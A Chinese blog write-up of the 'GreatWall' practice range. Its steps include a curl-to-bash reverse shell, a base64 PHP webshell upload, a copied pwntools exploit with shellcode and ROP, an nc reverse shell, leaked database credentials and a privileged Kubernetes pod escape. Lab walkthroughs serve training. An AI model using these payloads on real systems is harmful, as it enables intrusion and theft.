@@ -1,0 +1,348 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>GreatWall - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">GreatWall</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>长城杯</p>
+<h2 id="外围">外围</h2>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">39.101.64.202:80 open
+</span></span><span class="line"><span class="cl">39.101.64.202:443 open
+</span></span><span class="line"><span class="cl">39.101.64.202:8080 open
+</span></span><span class="line"><span class="cl">39.101.64.202:22 open
+</span></span></code></pre></div></div><p>扫出来有thinkphp</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813102213.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813102213.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>直接用工具梭,弹shell</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">curl https://reverse-shell.sh/8.149.142.195:9999 | bash
+</span></span></code></pre></div></div><p>把代理和fscan传上</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">wget -O fscan_amd64 --no-check-certificate https://8.149.142.195:60000/api/v1/d/?en=Wp0wffy8Oc%2BqDkbElVPyhQ%3D%3D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wget -O linux_x64_agent --no-check-certificate https://8.149.142.195:60000/api/v1/d/?en=H7GHGnxreyI/UAVGYCyK0w%3D%3D
+</span></span></code></pre></div></div><h2 id="内网">内网</h2>
+<p>这么多网段啊</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.22.16.23    ubuntu-web01    ubuntu-web01
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.31.23.17    portal  portal
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.28.23.17    portal  portal
+</span></span></code></pre></div></div><p>先看看能不能提权</p>
+<p>直接扫23</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.28.23.17 
+</span></span><span class="line"><span class="cl">	本机
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.28.23.26 
+</span></span><span class="line"><span class="cl">	ftp 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">172.28.23.33
+</span></span><span class="line"><span class="cl">	shiro heapdump
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.31.23.17
+</span></span></code></pre></div></div><h3 id="ftp">ftp</h3>
+<p>get OASystem.zip</p>
+<p>拿下来看看</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813110436.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813110436.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>直接传</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">POST /uploadbase64.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 172.28.23.26
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+</span></span><span class="line"><span class="cl">Cookie: id=1; loginname=1; jueseid=1; danweiid=1; quanxian=1;
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Content-Length: 69
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests::1
+</span></span><span class="line"><span class="cl">Content-Type:application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">imgbase64=data:image/php;base64, PD9waHAgQGV2YWwoJF9HRVRbMV0pOyA/Pg==
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
+</span></span></code></pre></div></div><p>蚁剑绕</p>
+<p>加载LD_PRELOAD插件后会生成</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">http://172.28.23.26/upload/.antproxy.php?1=system(%22find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null%22);
+</span></span></code></pre></div></div><p>文件,但是里面的POST马用不了,自己创建一个get马</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813112032.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813112032.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>替换掉就行</p>
+<p>然后suid发现</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">/usr/bin/base32
+</span></span></code></pre></div></div><p>直接提权拿到flag</p>
+<h3 id="shiro">shiro</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">/actuator/heapdump
+</span></span></code></pre></div></div><p>下载下来拿到shirokey</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">AZYyIgMYhG6/CzIJlvpR2g==
+</span></span></code></pre></div></div><p>进去后是个pwn题目</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813105439.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240813105439.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>不会</p>
+<p>抄别人的</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">elf = ELF(&#39;./HashNote&#39;)
+</span></span><span class="line"><span class="cl">context(arch=elf.arch, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+</span></span><span class="line"><span class="cl"># p = process(&#39;./HashNote&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p = remote(&#39;172.28.23.33&#39;, 59696)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def send_command(command):
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;: &#39;, str(command))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def add_entry(key, value):
+</span></span><span class="line"><span class="cl">    send_command(1)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;Key: &#39;, key)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;Data: &#39;, value)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def get_entry(key):
+</span></span><span class="line"><span class="cl">    send_command(2)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;Key: &#39;, key)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def update_entry(key, value):
+</span></span><span class="line"><span class="cl">    send_command(3)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;Key: &#39;, key)
+</span></span><span class="line"><span class="cl">    p.sendlineafter(b&#39;Data: &#39;, value)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def set_username(value):
+</span></span><span class="line"><span class="cl">    send_command(4)
+</span></span><span class="line"><span class="cl">    p.sendafter(b&#39;New username: &#39;, value)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Authenticate
+</span></span><span class="line"><span class="cl">p.sendlineafter(b&#39;Username: &#39;, b&#39;123&#39;)
+</span></span><span class="line"><span class="cl">p.sendlineafter(b&#39;Password: &#39;, b&#39;freep@ssw0rd:3&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Add entries to setup the environment
+</span></span><span class="line"><span class="cl">add_entry(b&#39;aabP&#39;, b&#39;aaaaaaaa&#39;)
+</span></span><span class="line"><span class="cl">add_entry(b&#39;aace&#39;, b&#39;C&#39; * 0xc0)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Shellcode to spawn a shell
+</span></span><span class="line"><span class="cl">sc = [
+</span></span><span class="line"><span class="cl">    b&#39;\x6a\x3b&#39;,                   # push   0x3b
+</span></span><span class="line"><span class="cl">    b&#39;\x58&#39;,                       # pop    rax
+</span></span><span class="line"><span class="cl">    b&#39;\x99&#39;,                       # cdq
+</span></span><span class="line"><span class="cl">    b&#39;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#39;, # movabs rbx, 0x68732f6e69622f2f
+</span></span><span class="line"><span class="cl">    b&#39;\x53&#39;,                       # push   rbx
+</span></span><span class="line"><span class="cl">    b&#39;\x48\x89\xe7&#39;,               # mov    rdi, rsp
+</span></span><span class="line"><span class="cl">    b&#39;\x52&#39;,                       # push   rdx
+</span></span><span class="line"><span class="cl">    b&#39;\x57&#39;,                       # push   rdi
+</span></span><span class="line"><span class="cl">    b&#39;\x48\x89\xe6&#39;,               # mov    rsi, rsp
+</span></span><span class="line"><span class="cl">    b&#39;\x0f\x05&#39;                    # syscall
+</span></span><span class="line"><span class="cl">]
+</span></span><span class="line"><span class="cl">shellcode = b&#39;&#39;.join(sc)
+</span></span><span class="line"><span class="cl">username_addr = 0x5dc980
+</span></span><span class="line"><span class="cl">fake_obj_addr = username_addr + 0x10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def arbitrary_read(addr):
+</span></span><span class="line"><span class="cl">    payload = p64(fake_obj_addr)
+</span></span><span class="line"><span class="cl">    payload += p64(0xdeadbeef)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)
+</span></span><span class="line"><span class="cl">    fake_obj += b&#39;aahO&#39;.ljust(0x10, b&#39;\x00&#39;)
+</span></span><span class="line"><span class="cl">    fake_obj += p64(addr) + p64(8) + b&#39;aaaaaaaa&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    payload += fake_obj
+</span></span><span class="line"><span class="cl">    payload += shellcode
+</span></span><span class="line"><span class="cl">    payload = payload.ljust(128, b&#39;\x00&#39;)
+</span></span><span class="line"><span class="cl">    set_username(payload)
+</span></span><span class="line"><span class="cl">    get_entry(b&#39;aahO&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def arbitrary_write(addr, data):
+</span></span><span class="line"><span class="cl">    payload = p64(fake_obj_addr)
+</span></span><span class="line"><span class="cl">    payload += p64(0xdeadbeef)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    fake_obj = p64(fake_obj_addr + 0x10) + p64(4)
+</span></span><span class="line"><span class="cl">    fake_obj += b&#39;aahO&#39;.ljust(0x10, b&#39;\x00&#39;)
+</span></span><span class="line"><span class="cl">    fake_obj += p64(addr) + p64(len(data)) + b&#39;aaaaaaaa&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    payload += fake_obj
+</span></span><span class="line"><span class="cl">    payload += shellcode
+</span></span><span class="line"><span class="cl">    payload = payload.ljust(128, b&#39;\x00&#39;)
+</span></span><span class="line"><span class="cl">    set_username(payload)
+</span></span><span class="line"><span class="cl">    update_entry(b&#39;aahO&#39;, data)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># Leak the stack address
+</span></span><span class="line"><span class="cl">environ = 0x5e4c38 
+</span></span><span class="line"><span class="cl">arbitrary_read(environ)
+</span></span><span class="line"><span class="cl">stack_addr = u64((p.recvuntil(b&#39;\x7f&#39;, drop=False)[-6:].ljust(8, b&#39;\0&#39;)))
+</span></span><span class="line"><span class="cl">success(&#39;stack_addr&#39;, stack_addr)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># ROP gadgets
+</span></span><span class="line"><span class="cl">rdi = 0x0000000000405e7c
+</span></span><span class="line"><span class="cl">rsi = 0x000000000040974f
+</span></span><span class="line"><span class="cl">rax = 0x00000000004206ba
+</span></span><span class="line"><span class="cl">rdx_rbx = 0x000000000053514b
+</span></span><span class="line"><span class="cl">shr_eax_2 = 0x0000000000523f2e
+</span></span><span class="line"><span class="cl">syscall_ret = 0x00000000004d9776
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># ROP payload to map memory and jump to shellcode
+</span></span><span class="line"><span class="cl">payload = p64(rdi) + p64(username_addr &amp; ~0xfff) + p64(rsi) + p64(0x1000) + p64(rdx_rbx) + p64(7) + p64(0) + p64(rax) + p64(0xa &lt;&lt; 2) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + 0x48)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">arbitrary_write(stack_addr - 0x210, payload)
+</span></span><span class="line"><span class="cl">p.sendline(b&#39;uname -ar&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></div></div><h3 id="172.22.14.6">172.22.14.6</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.28.23.33 9999 &gt;/tmp/f
+</span></span></code></pre></div></div><p>url编码后弹shell</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">./linux_x64_agent -c 172.28.23.17:10000 -s 123 --reconnect 8
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.14.6     is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.37    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.14.46    is alive
+</span></span></code></pre></div></div><p>接着扫</p>
+<h3 id="172.22.14.46">172.22.14.46</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
+</span></span></code></pre></div></div><p>直接打</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">❯ python harbor.py http://172.22.14.46/                                                             (base) 
+</span></span><span class="line"><span class="cl">[*] API version used v2.0
+</span></span><span class="line"><span class="cl">[+] project/projectadmin
+</span></span><span class="line"><span class="cl">[+] project/portal
+</span></span><span class="line"><span class="cl">[+] library/nginx
+</span></span><span class="line"><span class="cl">[+] library/redis
+</span></span><span class="line"><span class="cl">[+] harbor/secret
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">python harbor.py http://172.22.14.46/ --dump harbor/secret --v2
+</span></span></code></pre></div></div><h3 id="172.22.10.28">172.22.10.28</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">python harbor.py http://172.22.14.46/ --dump project/projectadmin --v2
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC
+</span></span><span class="line"><span class="cl">spring.datasource.username=root
+</span></span><span class="line"><span class="cl">spring.datasource.password=My3q1i4oZkJm3
+</span></span><span class="line"><span class="cl">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
+</span></span></code></pre></div></div><p>udf提权拿flag</p>
+<h3 id="172.22.14.37">172.22.14.37</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443  auth can-i --list --insecure-skip-tls-verify
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443 --insecure-skip-tls-verify get pods -o wide --all-namespaces
+</span></span><span class="line"><span class="cl">#得到一个pod 再去describe
+</span></span><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443 --insecure-skip-tls-verify describe pod nginx-deployment-58d48b746d-d6x8t -n default
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#用找到的image去写yaml
+</span></span><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443  --insecure-skip-tls-verify  create -f /tmp/a.yaml
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443   --insecure-skip-tls-verify  get pods
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443   --insecure-skip-tls-verify  exec -it pod --  &#39;/bin/bash&#39;
+</span></span></code></pre></div></div><p>a.yaml这样写</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">apiVersion: v1
+</span></span><span class="line"><span class="cl">kind: Pod
+</span></span><span class="line"><span class="cl">metadata:
+</span></span><span class="line"><span class="cl">  name: pod
+</span></span><span class="line"><span class="cl">  labels:
+</span></span><span class="line"><span class="cl">    app: pod
+</span></span><span class="line"><span class="cl">spec:
+</span></span><span class="line"><span class="cl">  containers:
+</span></span><span class="line"><span class="cl">  - name: pod
+</span></span><span class="line"><span class="cl">    image: nginx:1.8
+</span></span><span class="line"><span class="cl">    imagePullPolicy: IfNotPresent
+</span></span><span class="line"><span class="cl">    volumeMounts:
+</span></span><span class="line"><span class="cl">    - name: hostvolume
+</span></span><span class="line"><span class="cl">      mountPath: /pod
+</span></span><span class="line"><span class="cl">    ports:
+</span></span><span class="line"><span class="cl">    - containerPort: 80
+</span></span><span class="line"><span class="cl">    securityContext:
+</span></span><span class="line"><span class="cl">     privileged: true
+</span></span><span class="line"><span class="cl">  volumes:
+</span></span><span class="line"><span class="cl">  - name: hostvolume
+</span></span><span class="line"><span class="cl">    hostPath:
+</span></span><span class="line"><span class="cl">      path: /
+</span></span></code></pre></div></div><p>之前失误了,先删掉</p>
